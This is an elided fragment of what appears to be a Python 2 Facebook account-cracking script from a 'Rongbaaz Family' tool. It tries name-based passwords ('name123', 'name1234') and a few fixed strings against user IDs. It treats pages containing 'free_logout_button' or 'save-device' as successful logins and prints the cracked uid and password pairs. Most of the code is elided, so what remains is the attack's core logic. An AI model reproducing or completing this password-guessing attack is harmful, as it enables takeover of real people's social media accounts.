...
def tokenz():
	...
	try:
		...
		print" [+] Wellcome To Rongbaaz Family "
...
def pilih_menumbasic():
    ...
    def main(arg):
        ...
        try:
            ...
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123', 'Shanto', '458525', 'sayang']:
                ...
                if 'free_logout_button' in xo or 'save-device' in xo:
                    ...
                    try:
                        ...
                        print'\r\x1b[0;91m ︻[CP]🤣─────➳ ' + uid + ' | ' + pw + ' | ' + ttl + '                       '
            ...
            for asu in pw:
                ...
                if 'free_logout_button' in xo or 'save-device' in xo:
                    ...
                    try:
                        ...
                        print'\r\x1b[0;91m ︻[CP]🤣─────➳ ' + uid + ' | ' + asu + ' | ' + ttl + '                       '
